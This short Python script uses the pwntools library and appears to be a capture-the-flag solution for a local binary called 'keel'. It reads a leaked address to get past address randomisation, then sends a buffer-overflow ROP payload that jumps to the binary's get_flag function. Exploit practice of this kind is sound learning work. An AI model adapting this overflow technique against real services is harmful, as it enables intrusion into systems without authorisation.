from pwn import *
import re

elf = context.binary = ELF('./keel')
io = process()
io.sendlineafter(b'>> ', b'1')
buf = io.recvline().decode()

offset = 40
leak = re.findall('\. (0x.*?)\.Even', buf)[0]
elf.address = int(leak, 16) - elf.sym.main

rop = ROP(elf)
payload = flat(b'\x90' * offset, rop.ret.address, elf.sym.get_flag)
io.sendline(b'Y')
io.sendline(b'2')
io.sendline(payload)
io.interactive()